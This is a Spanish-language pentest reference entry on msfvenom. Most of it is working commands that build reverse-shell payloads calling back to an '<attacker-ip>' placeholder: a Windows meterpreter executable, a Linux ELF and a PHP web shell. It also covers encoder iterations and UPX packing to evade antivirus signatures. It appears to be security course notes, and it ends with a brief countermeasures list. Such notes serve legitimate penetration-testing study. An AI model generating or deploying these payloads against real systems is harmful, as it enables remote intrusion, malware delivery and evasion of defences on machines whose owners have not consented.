# Generación de Payloads con msfvenom

## Descripción
Uso de la herramienta msfvenom para crear payloads personalizados (shell reversa, bind shell) para diferentes plataformas. Permite combinar payloads de Metasploit con diversos formatos de salida y técnicas de evasión mediante encoders.

## Clasificación
- **Fase**: Explotación
- **MITRE ATT&CK**: T1587.001 (Develop Capabilities: Malware)
- **Plataforma**: Multi
- **Dificultad**: Básica

## Herramientas
- **msfvenom** (`-p`, `-f`, `-e`, `-i`) — herramienta unificada para la generación de payloads y codificación.
- **msfconsole** (`exploit/multi/handler`) — utilizado para recibir las conexiones de los payloads generados.
- **upx** — para comprimir ejecutables y dificultar el análisis estático simple.

## Comandos / Ejemplos

### Generación de shell reversa para Windows (Exe)
```bash
# Payload x64 codificado con shikata_ga_nai (si aplica arquitectura)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe -o shell.exe
```

### Payloads para Linux y Web
```bash
# Shell reversa ELF para Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f elf -o shell.elf

# Web shell en PHP
msfvenom -p php/reverse_php LHOST=<attacker-ip> LPORT=4444 -f raw -o shell.php
```

### Evasión básica con Encoders
```bash
# Codificar un payload para intentar evadir firmas estáticas
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

## Contramedidas
- Utilizar soluciones Endpoint Detection and Response (EDR) con análisis de comportamiento.
- Implementar AppLocker o Device Guard para permitir solo la ejecución de binarios firmados.
- Monitorizar conexiones de red inusuales hacia puertos no estándar.
- Realizar escaneos frecuentes de archivos en el servidor en busca de firmas conocidas.

## Referencias
- Rahalkar, S. (2017). *Metasploit for Beginners*. Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1587.001: Develop Capabilities: Malware. https://attack.mitre.org/techniques/T1587/001/
- Notas del proyecto: notas-md/INE Courses/INE Courses/Metasploit Framework.md
